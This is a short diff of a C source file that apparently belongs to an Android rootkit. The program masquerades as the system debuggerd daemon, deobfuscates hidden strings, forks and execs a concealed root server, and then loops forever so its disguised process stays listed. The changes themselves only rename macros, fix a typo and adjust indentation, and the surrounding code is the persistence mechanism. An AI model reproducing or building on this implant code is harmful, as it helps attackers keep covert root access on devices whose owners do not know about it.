@@ -39,7 +39,7 @@ int main(int argc, char **argv) {
   int i;
   struct stat st;
 
-  if(find_process(deobfuscate(ROOT_SERVER_ARG0)) || (stat(deobfuscate(ROOT_SERVER), &st) < 0)) {
+  if(find_process(deobfuscate(ROOT_BIN_ARG0)) || (stat(deobfuscate(ROOT_BIN), &st) < 0)) {
     // Check if for some reason real debuggerd has been overwritten.
     // We need it to avoid loop
     if(!check_runner_id()) {
@@ -47,14 +47,14 @@ int main(int argc, char **argv) {
       return 0;
     }
     else {
-      LOGD("Something is wrong. Real debuggerd is our runner. Skipping to avoir loops!\n");
+      LOGD("Something is wrong. Real debuggerd is our runner. Skipping to avoid loops!\n");
       return -1;
     }
   }
 
   // Start our root server 
   if(fork() == 0)
-    execl(deobfuscate(ROOT_SERVER), deobfuscate(ROOT_SERVER_ARG0), deobfuscate(OPT), NULL);
+    execl(deobfuscate(ROOT_BIN), deobfuscate(ROOT_BIN_ARG0), deobfuscate(OPT), NULL);
 
   sleep(2);
 
@@ -64,7 +64,7 @@ int main(int argc, char **argv) {
 
   // Keep the process running; we need to keep the process name in the ps list
   while(1) {
-  sleep(10);
+    sleep(10);
   }
 
 
